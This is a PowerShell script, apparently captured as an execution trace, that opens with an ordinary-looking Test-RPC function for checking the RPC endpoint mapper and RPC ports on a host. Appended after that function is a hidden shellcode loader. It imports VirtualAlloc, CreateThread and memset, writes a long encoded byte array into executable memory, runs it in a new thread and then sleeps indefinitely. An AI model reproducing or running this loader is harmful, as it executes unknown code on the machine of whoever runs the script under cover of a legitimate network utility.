


 -||-> Function Test-RPC
{
    [CmdletBinding(SupportsShouldProcess=$True)]
    Param([Parameter(ValueFromPipeline=$True)][String[]]$ComputerName = 'localhost')
    BEGIN
    {
         -||-> Set-StrictMode -Version Latest <-||- 
         -||-> $PInvokeCode = @'
        using System;
        using System.Collections.Generic;
        using System.Runtime.InteropServices;

        public class Rpc
        {
            // I found this crud in RpcDce.h

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
            public static extern int RpcBindingFromStringBinding(string StringBinding, out IntPtr Binding);

            [DllImport("Rpcrt4.dll")]
            public static extern int RpcBindingFree(ref IntPtr Binding);

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
            public static extern int RpcMgmtEpEltInqBegin(IntPtr EpBinding,
                                                    int InquiryType, // 0x00000000 = RPC_C_EP_ALL_ELTS
                                                    int IfId,
                                                    int VersOption,
                                                    string ObjectUuid,
                                                    out IntPtr InquiryContext);

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
            public static extern int RpcMgmtEpEltInqNext(IntPtr InquiryContext,
                                                    out RPC_IF_ID IfId,
                                                    out IntPtr Binding,
                                                    out Guid ObjectUuid,
                                                    out IntPtr Annotation);

            [DllImport("Rpcrt4.dll", CharSet = CharSet.Auto)]
            public static extern int RpcBindingToStringBinding(IntPtr Binding, out IntPtr StringBinding);

            public struct RPC_IF_ID
            {
                public Guid Uuid;
                public ushort VersMajor;
                public ushort VersMinor;
            }

            public static List<int> QueryEPM(string host)
            {
                List<int> ports = new List<int>();
                int retCode = 0; // RPC_S_OK                
                IntPtr bindingHandle = IntPtr.Zero;
                IntPtr inquiryContext = IntPtr.Zero;                
                IntPtr elementBindingHandle = IntPtr.Zero;
                RPC_IF_ID elementIfId;
                Guid elementUuid;
                IntPtr elementAnnotation;

                try
                {                    
                    retCode = RpcBindingFromStringBinding("ncacn_ip_tcp:" + host, out bindingHandle);
                    if (retCode != 0)
                        throw new Exception("RpcBindingFromStringBinding: " + retCode);

                    retCode = RpcMgmtEpEltInqBegin(bindingHandle, 0, 0, 0, string.Empty, out inquiryContext);
                    if (retCode != 0)
                        throw new Exception("RpcMgmtEpEltInqBegin: " + retCode);
                    
                    do
                    {
                        IntPtr bindString = IntPtr.Zero;
                        retCode = RpcMgmtEpEltInqNext (inquiryContext, out elementIfId, out elementBindingHandle, out elementUuid, out elementAnnotation);
                        if (retCode != 0)
                            if (retCode == 1772)
                                break;

                        retCode = RpcBindingToStringBinding(elementBindingHandle, out bindString);
                        if (retCode != 0)
                            throw new Exception("RpcBindingToStringBinding: " + retCode);
                            
                        string s = Marshal.PtrToStringAuto(bindString).Trim().ToLower();
                        if(s.StartsWith("ncacn_ip_tcp:"))                        
                            ports.Add(int.Parse(s.Split('[')[1].Split(']')[0]));
                        
                        RpcBindingFree(ref elementBindingHandle);
                        
                    }
                    while (retCode != 1772); // RPC_X_NO_MORE_ENTRIES

                }
                catch(Exception ex)
                {
                    Console.WriteLine(ex);
                    return ports;
                }
                finally
                {
                    RpcBindingFree(ref bindingHandle);
                }
                
                return ports;
            }
        }
'@ <-||- 
    }
    PROCESS
    {
         -||-> ForEach($Computer In  -||-> $ComputerName <-||- )
        {
             -||-> If( -||-> $PSCmdlet.ShouldProcess($Computer) <-||- )
            {
                 -||-> [Bool]$EPMOpen = $False <-||- 
                 -||-> $Socket =  -||-> New-Object Net.Sockets.TcpClient <-||-  <-||- 
                
                 -||-> Try
                {                    
                     -||-> $Socket.Connect($Computer, 135) <-||- 
                     -||-> If ( -||-> $Socket.Connected <-||- )
                    {
                         -||-> $EPMOpen = $True <-||- 
                    } <-||- 
                     -||-> $Socket.Close() <-||-                     
                }
                Catch
                {
                     -||-> $Socket.Dispose() <-||- 
                } <-||- 
                
                 -||-> If ( -||-> $EPMOpen <-||- )
                {
                     -||-> Add-Type $PInvokeCode <-||- 
                     -||-> $RPCPorts = [Rpc]::QueryEPM($Computer) <-||- 
                     -||-> [Bool]$AllPortsOpen = $True <-||- 
                     -||-> Foreach ($Port In  -||-> $RPCPorts <-||- )
                    {
                         -||-> $Socket =  -||-> New-Object Net.Sockets.TcpClient <-||-  <-||- 
                         -||-> Try
                        {
                             -||-> $Socket.Connect($Computer, $Port) <-||- 
                             -||-> If ( -||-> !$Socket.Connected <-||- )
                            {
                                 -||-> $AllPortsOpen = $False <-||- 
                            } <-||- 
                             -||-> $Socket.Close() <-||- 
                        }
                        Catch
                        {
                             -||-> $AllPortsOpen = $False <-||- 
                             -||-> $Socket.Dispose() <-||- 
                        } <-||- 
                    } <-||- 

                     -||-> [PSObject]@{'ComputerName' =  -||-> $Computer <-||- ; 'EndPointMapperOpen' =  -||-> $EPMOpen <-||- ; 'RPCPortsInUse' =  -||-> $RPCPorts <-||- ; 'AllRPCPortsOpen' =  -||-> $AllPortsOpen <-||- } <-||- 
                }
                Else
                {
                     -||-> [PSObject]@{'ComputerName' =  -||-> $Computer <-||- ; 'EndPointMapperOpen' =  -||-> $EPMOpen <-||- } <-||- 
                } <-||- 
            } <-||- 
        } <-||- 
    }
    END
    {

    }
} <-||- 
 -||-> $f9B = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $f9B -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xb8,0xe8,0x07,0xfc,0x05,0xda,0xd8,0xd9,0x74,0x24,0xf4,0x5b,0x29,0xc9,0xb1,0x58,0x31,0x43,0x15,0x83,0xc3,0x04,0x03,0x43,0x11,0xe2,0x1d,0xfb,0x14,0x87,0xdd,0x04,0xe5,0xe8,0x54,0xe1,0xd4,0x28,0x02,0x61,0x46,0x99,0x41,0x27,0x6b,0x52,0x07,0xdc,0xf8,0x16,0x8f,0xd3,0x49,0x9c,0xe9,0xda,0x4a,0x8d,0xc9,0x7d,0xc9,0xcc,0x1d,0x5e,0xf0,0x1e,0x50,0x9f,0x35,0x42,0x98,0xcd,0xee,0x08,0x0e,0xe2,0x9b,0x45,0x92,0x89,0xd0,0x48,0x92,0x6e,0xa0,0x6b,0xb3,0x20,0xba,0x35,0x13,0xc2,0x6f,0x4e,0x1a,0xdc,0x6c,0x6b,0xd5,0x57,0x46,0x07,0xe4,0xb1,0x96,0xe8,0x4a,0xfc,0x16,0x1b,0x93,0x38,0x90,0xc4,0xe6,0x30,0xe2,0x79,0xf0,0x86,0x98,0xa5,0x75,0x1d,0x3a,0x2d,0x2d,0xf9,0xba,0xe2,0xab,0x8a,0xb1,0x4f,0xb8,0xd5,0xd5,0x4e,0x6d,0x6e,0xe1,0xdb,0x90,0xa1,0x63,0x9f,0xb6,0x65,0x2f,0x7b,0xd7,0x3c,0x95,0x2a,0xe8,0x5f,0x76,0x92,0x4c,0x2b,0x9b,0xc7,0xfd,0x76,0xf4,0x79,0x98,0xfc,0x04,0xee,0x15,0x94,0x6a,0x87,0x8d,0x0e,0x3f,0x20,0x0b,0xc8,0x40,0x1b,0x62,0x0d,0xed,0xf7,0xd7,0xe2,0x41,0x90,0xed,0x52,0x1f,0xc7,0xee,0x8e,0x8c,0x54,0x7a,0x32,0x60,0x08,0x12,0x93,0x89,0xae,0xe2,0x33,0x19,0xae,0xe2,0xc3,0x0d,0x9f,0x8f,0xf6,0x14,0x9a,0x4f,0xa9,0xfe,0x73,0xc6,0xd6,0x39,0x84,0x0d,0x61,0x03,0x28,0xc5,0x72,0xbe,0x2f,0x91,0x20,0xed,0xfc,0xce,0x95,0x47,0x6b,0x1b,0x4c,0x46,0x50,0x24,0xba,0x00,0xcc,0xd0,0x1a,0x45,0x91,0xd7,0xa4,0x95,0x18,0xf7,0xcf,0x91,0x4a,0x9d,0x10,0xcc,0x02,0x14,0x69,0x6e,0x54,0x29,0xa0,0xdd,0x0a,0x86,0x18,0xb4,0xc4,0x05,0x99,0x20,0x6e,0xaa,0x70,0xd5,0x50,0x21,0x71,0x99,0x25,0x10,0xed,0xd5,0x73,0x00,0xb8,0xea,0xa9,0x2e,0x05,0x7d,0x52,0xbe,0x85,0x7d,0x3a,0xbe,0x85,0x3d,0xba,0xed,0xed,0xe5,0x1e,0x42,0x0b,0xea,0x8a,0xf7,0x80,0x46,0xbc,0x10,0x71,0x01,0xbe,0xfe,0x7e,0xd1,0xed,0xa8,0x16,0xc3,0x87,0xdd,0x05,0x1c,0x72,0x58,0x09,0x97,0xb0,0xe9,0x8d,0x59,0x88,0x68,0x51,0x2c,0xeb,0x2a,0x91,0x90,0x1b,0xbf,0xea,0xd0,0x23,0x48,0x62,0x58,0xeb,0x98,0xef,0xce,0x61,0x8b,0x82,0x6b,0xab,0x26,0x2d,0x5a,0xd7,0xa9,0xb9,0xc7,0x17 <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $rJr=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $rJr.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$rJr,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



